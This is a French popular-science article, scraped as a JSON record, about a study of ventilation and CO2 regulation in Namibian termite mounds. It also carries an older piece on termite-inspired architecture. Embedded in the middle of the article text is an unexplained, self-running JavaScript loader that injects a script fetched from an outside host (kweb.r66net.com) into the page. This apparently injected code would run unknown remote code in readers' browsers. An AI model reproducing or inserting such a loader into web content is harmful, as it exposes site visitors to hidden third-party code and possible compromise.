{"title": "Termitières : leur secret enfin dévoilé !", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "25/09/2017", "content": "Les termitières fascinent autant les entomologistes (les spécialistes des insectes) que les architectes : comment les termites parviennent-ils à réguler la température et le taux de CO 2  à l'intérieur de leurs tours hautes de 2 à 3 mètres et peuplées de millions d'individus ? Une nouvelle étude dévoile un de leurs secrets. Les termitières n'intéressent pas que les entomologistes mais aussi nombre d'architectes dans le monde fascinés par les capacités des  termites  à réguler, d'une part la température et, d'autre part, le taux de CO 2  à l'intérieur de ces édifices qui, à leur échelle, sont gigantesques. Comprendre le fonctionnement de ces tours bioclimatiques ne peut donc qu'aider à améliorer la conception de bâtiments passifs, dépourvus de climatisation énergivore. Voir aussi : Des robots constructeurs inspirés des termites Jusqu'à présent, la plupart des recherches ont porté sur les termitières indiennes, lesquelles sont généralement installées par  Odontotermes obesus  dans les zones ombragées. Leur fonctionnement interne est d'ailleurs loin de faire l'unanimité. Pour sa part, Samuel Ocko, diplômé du MIT, avec son équipe, s'est intéressé de très près aux termitières des savanes africaines, qui, à la différence de celles d'Asie, sont édifiées en plein soleil. Leurs architectes sont  Macrotermes michaelseni . Ils sont plusieurs millions à vivre et travailler à l'intérieur de tours mesurant entre 2 et 3 mètres de haut. Termitières dans la savane africaine. Elles sont en plein soleil et inclinées vers l’équateur. © fanfan, Fotolia                       Les termites exploitent le chauffage solaire pour la ventilation Comment fonctionne un monticule aussi peuplé de  termites , où chacun émet du dioxyde de carbone et de la chaleur ? Pour tenter de le découvrir, les chercheurs ont introduit des sondes afin de mesurer la température et aussi la circulation de l' air  à l'intérieur de  termitières  en Namibie, durant 35 jours. Inclinées vers l'équateur, ces termitières possèdent des orifices mesurant jusqu'à 0,5 cm, qui permettent, à travers de nombreux tunnels, les échanges avec l'intérieur.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Comme ils le décrivent dans leur article publié dans  Journal of Experimental Biology , alors que la température extérieure variait de 15 à 20 °C, celle de l'intérieur ne changeait en moyenne que de 8 °C. Quant au taux de CO 2 , il est demeuré constant, autour de 5 %, durant plus de 24 heures (ce qui n'est pas le cas pour les termitières indiennes), l'air circulant vers le haut le jour et vers le bas la nuit. Ils ont observé que la différence de température entre le centre de la termitière et l'extérieur créait une ventilation lisse. Le vent n'a en réalité qu'une influence secondaire. Les auteurs expliquent :  « Dans l'ensemble, nos observations montrent  [malgré des différences entre les termitières indiennes et africaines, NDLR]  que les architectures des termitières peuvent exploiter le chauffage solaire périodique pour conduire la ventilation à l'intérieur dans des environnements très différents, fonctionnant comme un poumon externe, avec des implications claires pour l'ingénierie humaine ». Pour en savoir plus Petite leçon d'architecture avec les termites Article de Caroline Lepage publié le 12 novembre 2004 Les buildings autosuffisants pousseront-ils un jour dans les grandes villes ? C'est le rêve d'une équipe d'ingénieurs anglais partis prendre des cours avec des spécialistes en la  matière ... Décollage immédiat pour l'Afrique du Sud ! Ici, en Namibie, ce sont les termitières qui poussent comme des  champignons .  Des monticules de  terre  s'élèvent comme des gratte-ciels, et abritent des sociétés de millions d'individus, les termites africains ( Macrotermes michaelseni ).  Ces bâtisseurs sont très organisés en matière d'architecture, et rien n'est laissé au hasard. Tunnels et conduits d'aération pour régler les flux d'air, la température et l'humidité, gestion des ressources d' énergie  et des  déchets ... Bref, la clim', la cantine et l'usine de  recyclage  : le tout-en-un à domicile ! Ces termites, appelés à tort  fourmis  blanches (puisqu'en réalité, les fourmis appartiennent à la famille des abeilles, bourdons, guêpes, et  frelons  : les hyménoptères), sont des  insectes  isoptères dont la colonie repose sur la reine.  Les soldats montent les  murs  de leur building grâce aux particules de terre récoltées en profondeur et stabilisées grâce à un  ciment  spécial régurgité par leurs soins. Ils ont aussi la particularité de pouvoir digérer la  cellulose  du  bois  mort dont ils se nourrissent. Ils stockent ainsi leurs excréments... sur lesquels ils cultivent un champignon appelé  Termitomyces  !  Ce dernier, en retour, s'intéressant également aux restes de cellulose, dégrade les excréments, aidé par d'autres  micro-organismes  du sol. Il rejette alors de l' oxygène , bien sûr réutilisé par les termites qui, de temps en temps à l'heure du casse-croûte, en profitent pour goûter aux saveurs du Termitomyces... Tout le monde y trouve finalement son compte sans avoir recours à une aide extérieure. Assistée par des entomologistes (spécialistes des insectes)  l'équipe du docteur Rupert Soar de l'école d'ingénieurs de l'Université Loughborough au Royaume-Uni, travaille sur un modèle informatique et un montage  numérique  afin de recréer parfaitement l'architecture d'une termitière... et d'en tirer le maximum d'informations.  Son ambition ? «  Nous espérons que nos découvertes fourniront des indices qui participeront au développement de nouvelles sortes d'habitats humains auto-suffisants.  Ces habitats pourraient convenir à une variété d'environnements arides, hostiles, pas seulement sur Terre mais peut-être un jour sur la  Lune  et ailleurs  » lance avec espoir le docteur Soar... La Floride envahie par les supertermites                       Il existe plus de 2.800 espèces de termites au travers le monde mais seul un petit nombre d'entre elles sont considérées comme nuisibles par l’Homme. Le termite souterrain de Formose et le termite souterrain d’Asie font partie des plus voraces. Leur hybridation donne naissance à un supertermite aux capacités étonnantes, à découvrir au cours de cette vidéo.                                       ", "theme": "planete"}